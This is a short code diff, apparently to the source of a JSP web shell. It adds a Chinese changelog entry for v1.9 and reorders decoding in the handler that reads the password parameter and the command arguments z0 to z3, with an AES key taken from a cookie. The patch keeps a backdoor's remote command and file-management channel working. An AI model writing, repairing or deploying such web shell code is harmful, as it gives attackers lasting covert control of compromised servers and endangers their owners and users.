@@ -24,6 +24,8 @@
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
+  v1.9
+    1. 修复由于decode函数与EC函数位置写反而导致的乱码问题
   v1.8
     1. 修复 hex 解码时 0A 丢失前缀0的问题
   v1.7
@@ -501,10 +503,10 @@ ChangeLog:
     try {
         AesKey = getKeyFromCookie(request.getCookies());
         String funccode = EC(request.getParameter(Pwd) + "");
-        String z0 = decode(EC(request.getParameter("z0")+""), encoder);
-        String z1 = decode(EC(request.getParameter("z1") + ""), encoder);
-        String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
-        String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
+        String z0 = EC(decode(request.getParameter("z0")+"", encoder));
+        String z1 = EC(decode(request.getParameter("z1")+"", encoder));
+        String z2 = EC(decode(request.getParameter("z2")+"", encoder));
+        String z3 = EC(decode(request.getParameter("z3")+"", encoder));
         String[] pars = { z0, z1, z2, z3};
         output.append(decode(RetS,"base64"));
 
